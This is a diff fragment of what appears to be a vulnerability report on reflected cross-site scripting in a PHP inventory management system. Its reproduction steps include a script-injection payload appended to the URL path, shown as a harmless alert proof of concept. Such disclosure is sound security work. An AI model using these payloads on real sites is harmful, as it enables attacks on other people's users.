@@ -13,7 +13,7 @@ Steps To Reproduce:
 
 2.  On the url, enter payload after url: cuzh4"><script>alert('VietNam')</script>rvhmf
 
-Payload: http://localhost/php-inventory-management-system/index.php/cuzh4%22%3E%3Cscript%3Ealert('LPC_VIETNAM')%3C/script%3Ervhmf
+    Payload: http://localhost/php-inventory-management-system/index.php/cuzh4%22%3E%3Cscript%3Ealert('LPC_VIETNAM')%3C/script%3Ervhmf
 ![image](https://github.com/ThuanNguyen115685/Report/assets/101619051/cf81a84c-5b2f-482a-baf2-2fac74c25c3b)
 
 Impact:
